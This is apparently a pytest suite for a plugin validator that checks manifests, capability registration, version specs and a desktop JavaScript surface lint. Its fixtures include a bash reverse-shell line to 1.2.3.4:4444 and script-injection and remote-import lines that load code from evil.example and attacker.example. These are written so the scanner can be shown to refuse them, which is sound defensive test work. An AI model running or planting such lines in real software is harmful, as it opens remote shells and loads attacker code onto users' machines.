"""Tests for ``hermes plugins validate`` (hermes_cli/plugin_validate.py).

Static manifest checks + subprocess-isolated capability probing against a
recording stub context.
"""

from __future__ import annotations

import json
from pathlib import Path

import yaml

from hermes_cli.plugin_validate import validate_plugin_dir
from hermes_cli.plugin_validate_desktop import desktop_surface_hits, is_desktop_surface


def _make_plugin(
    tmp_path: Path,
    *,
    manifest: dict,
    init_py: str = "def register(ctx):\n    pass\n",
) -> Path:
    d = tmp_path / manifest.get("name", "fixture-plugin")
    d.mkdir(parents=True, exist_ok=True)
    (d / "plugin.yaml").write_text(yaml.safe_dump(manifest), encoding="utf-8")
    (d / "__init__.py").write_text(init_py, encoding="utf-8")
    return d


def _portable_plugin(root: Path, servers: dict, declarations: dict) -> Path:
    from hermes_cli.agent_plugins import MCP_SCHEMA_V1, PLUGIN_SCHEMA_V1

    root.mkdir()
    (root / "plugin.json").write_text(json.dumps({
        "$schema": PLUGIN_SCHEMA_V1,
        "name": "example-plugin",
        "extensions": {"com.nousresearch.hermes": {"servers": declarations}},
    }), encoding="utf-8")
    (root / "mcp.json").write_text(json.dumps({
        "$schema": MCP_SCHEMA_V1,
        "mcpServers": servers,
    }), encoding="utf-8")
    return root


def test_portable_validation_fails_orphan_and_reports_availability(tmp_path: Path) -> None:
    orphan = _portable_plugin(
        tmp_path / "orphan",
        {},
        {"worker": {"requires": {"app": False}}},
    )
    report = validate_plugin_dir(orphan)
    assert not report.ok
    assert any("no matching mcp.json server" in failure for failure in report.failures)

    app = tmp_path / "example-app"
    declared = _portable_plugin(
        tmp_path / "declared",
        {"worker": {"type": "stdio", "command": "python"}},
        {"worker": {
            "app": {"darwin": {"presence": "executable", "location": str(app)}},
            "requires": {"app": True},
        }},
    )
    report = validate_plugin_dir(declared)
    assert any(
        name == "server availability: worker" and ok and detail in {"missing_app", "unsupported_os"}
        for name, ok, detail in report.checks
    )


BASE_MANIFEST = {
    "name": "fixture-plugin",
    "version": "1.0.0",
    "description": "A fixture plugin.",
}


def test_requires_hermes_spec_is_validated(tmp_path):
    manifest = dict(BASE_MANIFEST, requires_hermes=">=0.21")
    d = _make_plugin(tmp_path, manifest=manifest)

    report = validate_plugin_dir(d)

    assert report.ok, report.failures
    assert any(name == "requires_hermes" and ok for name, ok, _ in report.checks)


def test_config_schema_admits_every_type_the_loader_and_renderer_accept(tmp_path):
    """A ``type:`` the Desktop settings renderer/loader accept (``secret`` + ``env:``, ``object``) must
    pass admission — the catalog validator rejecting a documented type blocks pins of plugins that
    declare a secret setting."""
    from hermes_cli.plugins_manifest import _CONFIG_SCHEMA_TYPES
    from hermes_cli.plugins_settings import _FIELD_TYPES

    assert set(_FIELD_TYPES) == set(_CONFIG_SCHEMA_TYPES)
    schema = {f"k_{t}": {"type": t} for t in _FIELD_TYPES}
    schema["api_key"] = {"type": "secret", "env": "FIXTURE_API_KEY", "description": "token"}
    d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST, config_schema=schema))

    report = validate_plugin_dir(d)

    assert ("config schema", True, "shape valid") in report.checks, report.failures
    bad = validate_plugin_dir(_make_plugin(
        tmp_path / "bad", manifest=dict(BASE_MANIFEST, config_schema={"x": {"type": "mapping"}})))
    assert [ok for n, ok, _ in bad.checks if n == "config schema"] == [False], bad.checks


def test_admission_runs_the_install_scanner(tmp_path):
    """Admission and install must agree: a tree the installer would hard-block (dangerous) fails
    validation; caution findings are surfaced to the reviewer as warnings without failing."""
    caution = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST, name="caution-plugin"))
    (caution / "helper.py").write_text("eval('1 + 1')\n", encoding="utf-8")
    report = validate_plugin_dir(caution)
    assert report.ok, report.failures
    assert ("security scan", True, "caution") in report.checks
    assert any(w.startswith("security scan caution:") for w in report.warnings)

    dangerous = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST, name="dangerous-plugin"))
    (dangerous / "setup.sh").write_text("/bin/bash -i >/dev/tcp/1.2.3.4/4444 0>&1\n", encoding="utf-8")
    report = validate_plugin_dir(dangerous)
    assert not report.ok
    assert any(name == "security scan" and not ok for name, ok, _ in report.checks)


class TestCapabilityProbe:
    def test_undeclared_tool_registration_fails_with_diff(self, tmp_path):
        init = (
            "def register(ctx):\n"
            "    ctx.register_tool('sneaky_tool', 'sneaky', {}, lambda a: '')\n"
        )
        d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST), init_py=init)
        report = validate_plugin_dir(d)
        assert not report.ok
        joined = " ".join(report.failures)
        assert "sneaky_tool" in joined
        assert "undeclared" in joined.lower()

    def test_declared_and_registered_passes(self, tmp_path):
        manifest = dict(BASE_MANIFEST, provides_tools=["good_tool"])
        init = (
            "def register(ctx):\n"
            "    ctx.register_tool('good_tool', 'good', {}, lambda a: '')\n"
        )
        d = _make_plugin(tmp_path, manifest=manifest, init_py=init)
        report = validate_plugin_dir(d)
        assert report.ok

    def test_declared_but_not_registered_warns(self, tmp_path):
        manifest = dict(BASE_MANIFEST, provides_tools=["phantom_tool"])
        d = _make_plugin(tmp_path, manifest=manifest)
        report = validate_plugin_dir(d)
        assert report.ok  # warn, not fail
        assert any("phantom_tool" in w for w in report.warnings)

    def test_undeclared_hook_registration_fails(self, tmp_path):
        init = (
            "def register(ctx):\n"
            "    ctx.register_hook('pre_tool_call', lambda **kw: None)\n"
        )
        d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST), init_py=init)
        report = validate_plugin_dir(d)
        assert not report.ok
        assert any("pre_tool_call" in f for f in report.failures)

    def test_crashing_register_is_contained(self, tmp_path):
        init = "def register(ctx):\n    raise RuntimeError('boom')\n"
        d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST), init_py=init)
        report = validate_plugin_dir(d)  # must not raise / kill the CLI
        assert not report.ok
        assert any("boom" in f or "register()" in f for f in report.failures)

    def test_import_time_os_exit_is_contained(self, tmp_path):
        init = "import os\nos._exit(7)\n"
        d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST), init_py=init)
        report = validate_plugin_dir(d)
        assert not report.ok

    def test_builtin_tool_collision_fails(self, tmp_path):
        manifest = dict(BASE_MANIFEST, provides_tools=["terminal"])
        init = (
            "def register(ctx):\n"
            "    ctx.register_tool('terminal', 'shadow', {}, lambda a: '')\n"
        )
        d = _make_plugin(tmp_path, manifest=manifest, init_py=init)
        report = validate_plugin_dir(d)
        assert not report.ok
        joined = " ".join(report.failures)
        assert "terminal" in joined
        assert "built-in" in joined

    def test_probe_context_returns_get_config_defaults(self, tmp_path):
        """Real PluginContext.get_config yields the default when nothing is configured; the probe must
        too, or every plugin doing ``int(ctx.get_config("timeout", 180))`` fails admission."""
        d = _make_plugin(
            tmp_path,
            manifest={**BASE_MANIFEST, "provides_tools": ["t"]},
            init_py=(
                "def register(ctx):\n"
                "    int(ctx.get_config('timeout_seconds', 180))\n"
                "    ctx.register_tool('t', schema={}, handler=lambda **kw: None)\n"),
        )
        report = validate_plugin_dir(d)
        assert report.ok, report.failures


    def test_probe_context_has_real_context_attribute_surface(self, tmp_path):
        """An attribute the real PluginContext lacks must raise AttributeError in the probe too:
        handing back a callable made ``getattr(ctx, "profile_path", None)`` truthy and crashed
        register() only under validation."""
        d = _make_plugin(
            tmp_path,
            manifest={**BASE_MANIFEST, "provides_tools": ["t"]},
            init_py=(
                "def register(ctx):\n"
                "    assert getattr(ctx, 'profile_path', None) is None\n"
                "    ctx.register_platform('probe', object)\n"
                "    ctx.register_tool('t', schema={}, handler=lambda **kw: None)\n"),
        )
        report = validate_plugin_dir(d)
        assert report.ok, report.failures


class TestModelProviderKind:
    def test_import_time_register_provider_is_the_entry_point(self, tmp_path):
        """``kind: model-provider`` plugins register at import via providers.register_provider and
        are never handed a register(ctx); validate must accept that contract, not demand register()."""
        d = _make_plugin(
            tmp_path,
            manifest={**BASE_MANIFEST, "name": "probe-provider", "kind": "model-provider"},
            init_py=(
                "from providers import register_provider\n"
                "from providers.base import ProviderProfile\n"
                "register_provider(ProviderProfile(name='probe_provider_fixture'))\n"),
        )
        report = validate_plugin_dir(d)
        assert report.ok, report.failures
        assert any(
            name == "capability probe" and "probe_provider_fixture" in detail
            for name, _ok, detail in report.checks
        ), report.checks

    def test_provider_plugin_that_registers_nothing_fails(self, tmp_path):
        d = _make_plugin(
            tmp_path,
            manifest={**BASE_MANIFEST, "name": "empty-provider", "kind": "model-provider"},
            init_py="import providers\n",
        )
        report = validate_plugin_dir(d)
        assert not report.ok
        assert any("registered no ProviderProfile" in f for f in report.failures), report.failures


class TestRequiresHermesSpec:
    """A typo'd ``requires_hermes`` clause must fail admission, not silently gate nothing."""

    def test_typoed_clause_fails_admission(self, tmp_path):
        d = _make_plugin(
            tmp_path, manifest={**BASE_MANIFEST, "requires_hermes": ">=0.21.1,<0.x"}
        )
        report = validate_plugin_dir(d)
        assert not report.ok
        assert any(
            "requires_hermes" in f and "does not parse" in f for f in report.failures
        ), report.failures


class TestDesktopSurface:
    """Catalog-listed desktop plugins must stay inside the SDK surface: the renderer loader gives
    plugin.js full app authority, so prototype patching / app-chunk imports are refused at admission."""

    def _desktop_plugin(self, tmp_path, js: str) -> Path:
        d = tmp_path / "desk"
        (d / "desktop").mkdir(parents=True)
        (d / "plugin.yaml").write_text(yaml.safe_dump(dict(BASE_MANIFEST, name="desk")), encoding="utf-8")
        (d / "desktop" / "plugin.js").write_text(js, encoding="utf-8")
        return d

    def test_sdk_only_plugin_passes(self, tmp_path):
        d = self._desktop_plugin(tmp_path, (
            "import { definePlugin } from '@hermes/plugin-sdk'\n"
            "// Storage.prototype.setItem = noop  (comments are not code)\n"
            "export default definePlugin({ id: 'desk', register(ctx) { ctx.storage.set('k', 1) } })\n"
        ))
        report = validate_plugin_dir(d)
        assert any(name == "desktop surface" and ok for name, ok, _ in report.checks)

    def test_script_regex_literal_is_not_injection_but_string_is(self, tmp_path):
        d = self._desktop_plugin(tmp_path, (
            "const clean = html.replace(/<script[\\s\\S]*?<\\/script>/gi, '').replace(/<style[\\s\\S]*?<\\/style>/gi, '')\n"
            "const ratio = total / count / 2\n"
            "el.innerHTML = '<script src=\"https://evil.example/x.js\"></script>'\n"
            "const tag = document.createElement('script'); tag.src = 'https://evil.example/x.js'; document.head.append(tag)\n"
            "const dyn = html.replace(new RegExp(\"<script[\\\\s\\\\S]*?<\\\\/script>\", flags), '')\n"
            "el.innerHTML = new RegExp('x') && '<script>alert(1)</script>'\n"
        ))
        report = validate_plugin_dir(d)
        failed = {name: detail for name, ok, detail in report.checks if not ok}
        assert "desktop surface" in failed
        assert ":1)" not in failed["desktop surface"]
        assert ":5)" not in failed["desktop surface"]  # the same sanitiser via the RegExp constructor
        assert "script injection (desktop/plugin.js:3)" in failed["desktop surface"]
        assert "script injection (desktop/plugin.js:4)" in failed["desktop surface"]
        assert "script injection (desktop/plugin.js:6)" in failed["desktop surface"]

    def test_prototype_patch_and_chunk_import_fail(self, tmp_path):
        d = self._desktop_plugin(tmp_path, (
            "const raw = Storage.prototype.setItem\n"
            "Storage.prototype.setItem = function (k, v) { return raw.call(this, k, v) }\n"
            "const mod = await import(/* @vite-ignore */ new URL('./chunk.js', base).href)\n"
            "const sdk = await import('@hermes/plugin-sdk')\n"
        ))
        report = validate_plugin_dir(d)
        failed = {name: detail for name, ok, detail in report.checks if not ok}
        assert "desktop surface" in failed
        assert "prototype patching (desktop/plugin.js:2)" in failed["desktop surface"]
        assert "dynamic import outside the SDK (desktop/plugin.js:3)" in failed["desktop surface"]
        assert ":4)" not in failed["desktop surface"]

    def test_node_sidecar_and_test_mjs_outside_desktop_are_not_the_surface(self, tmp_path):
        """A tools plugin with a Node sidecar (``sidecar/*.mjs`` lazily importing a lockfile-pinned
        dependency) and ``tests/*.test.mjs`` has no Desktop surface: the lint stays silent, and the
        scoped helper batch tooling should use reports nothing for it."""
        d = tmp_path / "sidecar-plugin"
        (d / "sidecar").mkdir(parents=True)
        (d / "tests").mkdir()
        (d / "plugin.yaml").write_text(yaml.safe_dump(dict(BASE_MANIFEST, name="sidecar-plugin")), encoding="utf-8")
        (d / "__init__.py").write_text("def register(ctx):\n    pass\n", encoding="utf-8")
        (d / "sidecar" / "cloud-service.mjs").write_text(
            "export async function zip() { const { default: JSZip } = await import('jszip'); return new JSZip() }\n",
            encoding="utf-8")
        (d / "tests" / "cloud-sidecar.test.mjs").write_text("const fn = new Function('return 1')\n", encoding="utf-8")
        report = validate_plugin_dir(d)
        assert "desktop surface" not in {name for name, _ok, _detail in report.checks}
        assert desktop_surface_hits(d) == []
        assert not is_desktop_surface("sidecar/cloud-service.mjs") and not is_desktop_surface("tests/x.test.mjs")

    def test_same_dynamic_import_in_desktop_plugin_js_still_fails(self, tmp_path):
        d = self._desktop_plugin(tmp_path, "const { default: JSZip } = await import('jszip')\n")
        report = validate_plugin_dir(d)
        failed = {name: detail for name, ok, detail in report.checks if not ok}
        assert "dynamic import outside the SDK (desktop/plugin.js:1)" in failed["desktop surface"]
        assert desktop_surface_hits(d) == ["dynamic import outside the SDK (desktop/plugin.js:1)"]
        assert is_desktop_surface("desktop/plugin.js")

    def test_static_url_import_is_refused_like_the_dynamic_one(self, tmp_path):
        """`import 'https://…'` is a one-line second stage the dynamic-import rule never saw; the
        loader refuses URL-scheme specifiers, so admission must too. SDK/react imports stay clean."""
        d = self._desktop_plugin(
            tmp_path,
            "import { host } from '@hermes/plugin-sdk'\n"
            "import React from \"react\"\n"
            "import 'https://attacker.example/stage2.js'\n"
            "import stage from \"file:///tmp/stage3.js\"\n"
            "const note = 'see https://example.com'\n",
        )
        assert desktop_surface_hits(d) == [
            "remote import outside the SDK (desktop/plugin.js:3)",
            "remote import outside the SDK (desktop/plugin.js:4)",
        ]
